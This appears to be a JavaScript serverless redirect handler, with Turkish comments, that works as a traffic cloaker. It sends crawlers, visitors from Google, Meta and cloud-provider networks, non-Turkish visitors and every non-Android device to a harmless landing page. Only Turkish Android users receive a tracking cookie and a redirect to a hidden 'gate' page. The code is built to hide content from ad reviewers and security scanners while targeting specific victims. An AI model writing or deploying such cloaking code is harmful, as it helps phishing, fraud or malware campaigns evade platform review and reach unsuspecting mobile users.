// ASN tabanlı bot tespiti (IP aralığından çok daha güvenilir)
const BOT_ASNS = new Set([
    '15169',  // Google
    '32934',  // Facebook/Meta
    '54113',  // Fastly
    '16509',  // Amazon AWS
    '14618',  // Amazon
    '8075',   // Microsoft Azure
    '13335',  // Cloudflare
    '20940',  // Akamai
    '36351',  // SoftLayer/IBM
    '16276',  // OVH
    '14061',  // DigitalOcean
    '63949',  // Linode
    '24940',  // Hetzner
    '7224',   // Amazon EC2
    '396982', // Google Cloud
    '19527',  // Google
    '36492',  // Google
]);

// Facebook ve Google crawler IP aralıkları (CIDR)
const CRAWLER_CIDRS = [
    // Facebook/Meta
    '31.13.24.0/21','31.13.64.0/18','66.220.144.0/20','69.63.176.0/20',
    '69.171.224.0/19','74.119.76.0/22','103.4.96.0/22','129.134.0.0/17',
    '157.240.0.0/17','173.252.64.0/18','179.60.192.0/22','185.60.216.0/22',
    '204.15.20.0/22',
    // Google
    '8.34.208.0/20','8.35.192.0/20','23.236.48.0/20','23.251.128.0/19',
    '34.0.0.0/9','34.128.0.0/10','35.184.0.0/13','35.192.0.0/14',
    '35.196.0.0/15','35.198.0.0/16','35.199.0.0/17','35.200.0.0/13',
    '35.208.0.0/12','35.224.0.0/12','35.240.0.0/13','64.233.160.0/19',
    '66.102.0.0/20','66.249.64.0/19','66.249.80.0/20','72.14.192.0/18',
    '74.125.0.0/16','108.177.8.0/21','108.177.96.0/19','130.211.0.0/16',
    '172.217.0.0/16','172.253.0.0/16','173.194.0.0/16','207.126.144.0/20',
    '209.85.128.0/17','216.58.192.0/19','216.239.32.0/19',
];

function ipToInt(ip) {
    return ip.split('.').reduce((acc, oct) => (acc << 8) + parseInt(oct, 10), 0) >>> 0;
}

function isCrawlerIP(ip) {
    if (!ip || !/^\d+\.\d+\.\d+\.\d+$/.test(ip)) return false;
    const ipInt = ipToInt(ip);
    for (const cidr of CRAWLER_CIDRS) {
        const [range, bits] = cidr.split('/');
        const mask = ~((1 << (32 - parseInt(bits))) - 1) >>> 0;
        if ((ipInt & mask) === (ipToInt(range) & mask)) return true;
    }
    return false;
}

export default function handler(req, res) {
    const ua = req.headers['user-agent'] || '';
    const uaLower = ua.toLowerCase();
    const country = req.headers['x-vercel-ip-country'] || 'XX';
    const asn = (req.headers['x-vercel-ip-autonomous-system-number'] || '').replace(/\D/g, '');

    // Gerçek IP al
    const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
        || req.headers['x-real-ip']
        || '';

    // Accept-Language header kontrolü (TR olmalı)
    const acceptLang = (req.headers['accept-language'] || '').toLowerCase();
    const hasAcceptLang = acceptLang.length > 0;
    const isTurkishLang = acceptLang.includes('tr');

    // UA bot kontrolleri
    const isBot = /bot|crawl|spider|headless|phantom|selenium|webdriver|puppeteer|playwright|facebookexternalhit|facebot|googlebot|bingbot|yandex|baidu|duckduck|applebot|twitterbot|slurp|ahrefsbot|semrushbot/i.test(ua);

    // Cihaz kontrolleri
    const isAndroid = uaLower.includes('android');
    const isWindows = uaLower.includes('windows');
    const isMac = uaLower.includes('macintosh');
    const isIOS = uaLower.includes('iphone') || uaLower.includes('ipad');
    const isLinuxDesktop = uaLower.includes('x11') || (uaLower.includes('linux') && !isAndroid);

    // Ülke kontrolü
    const isNotTurkey = country !== 'TR';

    // ASN kontrolü (datacenter/hosting)
    const isBotASN = asn && BOT_ASNS.has(asn);

    // IP aralığı kontrolü
    const isCrawler = isCrawlerIP(ip);

    // HTTP/2 fingerprint — Vercel bu header'ı set eder
    const proto = req.headers['x-forwarded-proto'] || '';

    // Accept header kontrolü — gerçek browser'da çok daha uzun olur
    const accept = req.headers['accept'] || '';
    const isCurlOrEmpty = accept === '*/*' || accept === '';

    // Tüm engelleme koşulları
    if (
        isBot || isBotASN || isCrawler ||
        isWindows || isMac || isIOS || isLinuxDesktop ||
        isNotTurkey || !isAndroid ||
        isCurlOrEmpty ||
        (!hasAcceptLang)
    ) {
        res.setHeader('Cache-Control', 'no-store');
        res.setHeader('Location', '/landing.html');
        res.status(302).end();
        return;
    }

    res.setHeader('Cache-Control', 'no-store');
    res.setHeader('Set-Cookie', '_src=1; Path=/; Max-Age=604800; SameSite=Lax');
    res.setHeader('Location', '/gate.html');
    res.status(302).end();
}
